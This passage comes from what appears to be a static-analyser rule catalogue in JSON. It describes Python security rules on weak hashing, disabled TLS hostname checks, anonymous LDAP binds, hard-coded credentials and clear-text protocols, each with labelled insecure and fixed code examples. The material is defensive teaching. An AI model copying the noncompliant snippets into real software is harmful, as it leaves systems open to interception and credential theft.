block_public_policy=True,\n        restrict_public_buckets=True\n    )\n)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html\">AWS Documentation</a> - Blocking public\n  access to your Amazon S3 storage </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_s3/Bucket.html\">AWS CDK version 2</a> - Bucket </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S2257": {
        "name": "Using non-standard cryptographic algorithms is security-sensitive",
        "htmlDesc": "<p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has\nbeen protected. Standard algorithms like <code>Argon2PasswordHasher</code>, <code>BCryptPasswordHasher</code>, …​ should be used instead.</p>\n<p>This rule tracks creation of <code>BasePasswordHasher</code> subclasses for Django applications.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a standard algorithm instead of creating a custom one. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nclass CustomPasswordHasher(BasePasswordHasher):  # Sensitive\n    # ...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S4433": {
        "name": "LDAP connections should be authenticated",
        "htmlDesc": "<p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The\n<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>\n<ul>\n  <li> <em>Anonymous</em> Authentication </li>\n  <li> <em>Unauthenticated</em> Authentication </li>\n  <li> <em>Name/Password</em> Authentication </li>\n</ul>\n<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing\ncredentials.</p>\n<h2>Why is this an issue?</h2>\n<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do\nnot provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted\ndirectory.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact\nvaries depending on the permission obtained on the directory and the type of data it stores.</p>\n<h4>Authentication bypass</h4>\n<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data\nsuch as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the\naffected directory as an identity provider.</p>\n<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>\n<h4>Sensitive information leak</h4>\n<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces\nof information.</p>\n<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to\nperform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>\n<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements\nin some countries. For example, this kind of security event would go against the European GDPR law.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple\nauthentication mechanism.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport ldap\n\ndef init_ldap():\n   connect = ldap.initialize('ldap://example:1389')\n\n   connect.simple_bind('cn=root') # Noncompliant\n   connect.simple_bind_s('cn=root') # Noncompliant\n   connect.bind_s('cn=root', None) # Noncompliant\n   connect.bind('cn=root', None) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport ldap\nimport os\n\ndef init_ldap():\n   connect = ldap.initialize('ldap://example:1389')\n\n   connect.simple_bind('cn=root', os.environ.get('LDAP_PASSWORD'))\n   connect.simple_bind_s('cn=root', os.environ.get('LDAP_PASSWORD'))\n   connect.bind_s('cn=root', os.environ.get('LDAP_PASSWORD'))\n   connect.bind('cn=root', os.environ.get('LDAP_PASSWORD'))\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://datatracker.ietf.org/doc/html/rfc4513#section-5\">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication\n  Methods and Security Mechanisms</a> - Bind operations </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/521\">CWE-521 - Weak Password Requirements</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport hashlib\nm = hashlib.md5() // Sensitive\n</pre>\n<pre>\nimport hashlib\nm = hashlib.sha1() // Sensitive\n</pre>\n<pre>\nimport md5 // Sensitive and deprecated since Python 2.5; use the hashlib module instead.\nm = md5.new()\n\nimport sha // Sensitive and deprecated since Python 2.5; use the hashlib module instead.\nm = sha.new()\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport hashlib\nm = hashlib.sha512() // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S5527": {
        "name": "Server hostnames should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability allows attackers to impersonate a trusted host.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this\nprocess, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding\nan extra layer of trust and security.</p>\n<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity\nand intercept, manipulate, or steal the data being transmitted.</p>\n<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the\napplication code would still accept it.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build\nthis trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit\nthis by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,\ntricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data\nyour system sends to them, potentially leading to significant data breaches.</p>\n<h2>How to fix it in Python Standard Library</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>Certificate validation is not enabled by default when <code>_create_unverified_context</code> or <code>_create_stdlib_context</code> is used. It is\nrecommended to use <code>create_default_context</code>, without explicitly setting <code>check_hostname</code> to <code>False</code>.<br> Doing so\ncreates a secure context that validates both hostnames and certificates.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport ssl\n\nexample = ssl._create_stdlib_context() # Noncompliant\n\nexample = ssl._create_default_https_context()\nexample.check_hostname = False # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport ssl\n\nexample = ssl.create_default_context()\n\nexample = ssl._create_default_https_context()\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around\nanother system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the system’s trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/297\">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S4792": {
        "name": "Configuring loggers is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285\">CVE-2018-0285</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127\">CVE-2000-1127</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113\">CVE-2017-15113</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742\">CVE-2015-5742</a> </li>\n</ul>\n<p>Logs are useful before, during and after a security incident.</p>\n<ul>\n  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it\n  is the first step to prevent an attack from ever happening. </li>\n  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>\n</ul>\n<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information\nlogged and how they are logged.</p>\n<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives\n  access to them. </li>\n  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>\n  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the\n  user can perform the action as many times as he/she wants. </li>\n  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)\n  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>\n  <li> the logs are only stored locally instead of being backuped or replicated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Check that your production deployment doesn’t have its loggers in \"debug\" mode as it might write sensitive information in logs. </li>\n  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>\n  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the\n  hostname. </li>\n  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the\n  impact is known and limited. </li>\n  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the\n  service are secure too. </li>\n  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control\n  the logged information. An attacker could just repeat a logged action many times. </li>\n</ul>\n<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your\nlogs:</p>\n<ul>\n  <li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user\n  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li>\n  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user\n  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example\n  use all your storage space or compromise your log indexing service. </li>\n  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as\n  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>\n  <li> Monitor the logs for any suspicious activity. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport logging\nfrom logging import Logger, Handler, Filter\nfrom logging.config import fileConfig, dictConfig\n\nlogging.basicConfig()  # Sensitive\n\nlogging.disable()  # Sensitive\n\n\ndef update_logging(logger_class):\n    logging.setLoggerClass(logger_class)  # Sensitive\n\n\ndef set_last_resort(last_resort):\n    logging.lastResort = last_resort  # Sensitive\n\n\nclass CustomLogger(Logger):  # Sensitive\n    pass\n\n\nclass CustomHandler(Handler):  # Sensitive\n    pass\n\n\nclass CustomFilter(Filter):  # Sensitive\n    pass\n\n\ndef update_config(path, config):\n    fileConfig(path)  # Sensitive\n    dictConfig(config)  # Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532\">CWE-532 - Information Exposure Through Log Files</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nusername = 'admin'\npassword = 'admin' # Sensitive\nusernamePassword = 'user=admin&amp;password=admin' # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport os\n\nusername = os.getenv(\"username\") # Compliant\npassword = os.getenv(\"password\") # Compliant\nusernamePassword = 'user=%s&amp;password=%s' % (username, password) # Compliant{code}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nurl = \"http://example.com\" # Sensitive\nurl = \"ftp://anonymous@example.com\" # Sensitive\nurl = \"telnet://anonymous@example.com\" # Sensitive\n\nimport telnetlib\ncnx = telnetlib.Telnet(\"towel.blinkenlights.nl\") # Sensitive\n\nimport ftplib\ncnx = ftplib.FTP(\"ftp.example.com\") # Sensitive\n\nimport smtplib\nsmtp = smtplib.SMTP(\"smtp.example.com\", port=587) # Sensitive\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationLoadBalancer.html\">aws_cdk.aws_elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancingv2 as elbv2,\n)\n\nlb = elbv2.ApplicationLoadBalancer(\n    self,\n    \"LB\",\n    vpc=vpc,\n    internet_facing=True\n)\n\nlb.add_listener(\n    \"Listener-default\",\n    port=80, # Sensitive\n    open=True\n)\nlb.add_listener(\n    \"Listener-http-explicit\",\n    protocol=elbv2.ApplicationProtocol.HTTP, # Sensitive\n    port=8080,\n    open=True\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationListener.html\">aws_cdk.aws_elasticloadbalancingv2.ApplicationListener</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancingv2 as elbv2,\n)\n\nelbv2.ApplicationListener(\n    self,\n    \"listener-http-explicit-const\",\n    load_balancer=lb,\n    protocol=elbv2.ApplicationProtocol.HTTP, # Sensitive\n    port=8081,\n    open=True\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkLoadBalancer.html\">aws_cdk.aws_elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancingv2 as elbv2,\n)\nlb = elbv2.NetworkLoadBalancer(\n    self,\n    \"LB\",\n    vpc=vpc,\n    internet_facing=True\n)\n\nlb.add_listener( # Sensitive\n    \"Listener-default\",\n    port=1234\n)\nlb.add_listener(\n    \"Listener-TCP-explicit\",\n    protocol=elbv2.Protocol.TCP, # Sensitive\n    port=1337\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkListener.html\">aws_cdk.aws_elasticloadbalancingv2.NetworkListener</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancingv2 as elbv2,\n)\n\nelbv2.NetworkListener(\n    self,\n    \"Listener-TCP-explicit\",\n    protocol=elbv2.Protocol.TCP, # Sensitive\n    port=1338,\n    load_balancer=lb\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/CfnListener.html\">aws_cdk.aws_elasticloadbalancingv2.CfnListener</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancingv2 as elbv2,\n)\n\nelbv2.CfnListener(\n    self,\n    \"listener-http\",\n    default_actions=[application_default_action],\n    load_balancer_arn=lb.load_balancer_arn,\n    protocol=\"HTTP\", # Sensitive\n    port=80\n)\n\nelbv2.CfnListener(\n    self,\n    \"listener-tcp\",\n    default_actions=[network_default_action],\n    load_balancer_arn=lb.load_balancer_arn,\n    protocol=\"TCP\", # Sensitive\n    port=1000\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancerListener.html\">aws_cdk.aws_elasticloadbalancing.LoadBalancerListener</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancing as elb,\n)\n\nelb.LoadBalancerListener(\n    external_port=10000,\n    external_protocol=elb.LoadBalancingProtocol.TCP, # Sensitive\n    internal_port=10000\n)\n\nelb.LoadBalancerListener(\n    external_port=10080,\n    external_protocol=elb.LoadBalancingProtocol.HTTP, # Sensitive\n    internal_port=10080\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/CfnLoadBalancer.html\">aws_cdk.aws_elasticloadbalancing.CfnLoadBalancer</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancing as elb\n)\n\nelb.CfnLoadBalancer(\n    self,\n    \"elb-tcp\",\n    listeners=[\n        elb.CfnLoadBalancer.ListenersProperty(\n            instance_port=\"10000\",\n            load_balancer_port=\"10000\",\n            protocol=\"tcp\" # Sensitive\n        )\n    ],\n    subnets=vpc.select_subnets().subnet_ids\n)\n\nelb.CfnLoadBalancer(\n    self,\n    \"elb-http-dict\",\n    listeners=[\n        {\n            \"instancePort\":\"10000\",\n            \"loadBalancerPort\":\"10000\",\n            \"protocol\":\"http\" # Sensitive\n        }\n    ],\n    subnets=vpc.select_subnets().subnet_ids\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancer.html\">aws_cdk.aws_elasticloadbalancing.LoadBalancer</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticloadbalancing as elb,\n)\n\nelb.LoadBalancer(\n    self,\n    \"elb-tcp-dict\",\n    vpc=vpc,\n    listeners=[\n        {\n            \"externalPort\":10000,\n            \"externalProtocol\":elb.LoadBalancingProtocol.TCP, # Sensitive\n            \"internalPort\":10000\n        }\n    ]\n)\n\nloadBalancer.add_listener(\n    external_port=10081,\n    external_protocol=elb.LoadBalancingProtocol.HTTP, # Sensitive\n    internal_port=10081\n)\nloadBalancer.add_listener(\n    external_port=10001,\n    external_protocol=elb.LoadBalancingProtocol.TCP, # Sensitive\n    internal_port=10001\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticache/CfnReplicationGroup.html\">aws_cdk.aws_elasticache.CfnReplicationGroup</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_elasticache as elasticache\n)\n\nelasticache.CfnReplicationGroup(\n    self,\n    \"unencrypted-explicit\",\n    replication_group_description=\"a replication group\",\n    automatic_failover_enabled=False,\n    transit_encryption_enabled=False, # Sensitive\n    cache_subnet_group_name=\"test\",\n    engine=\"redis\",\n    engine_version=\"3.2.6\",\n    num_cache_clusters=1,\n    cache_node_type=\"cache.t2.micro\"\n)\n\nelasticache.CfnReplicationGroup( # Sensitive, 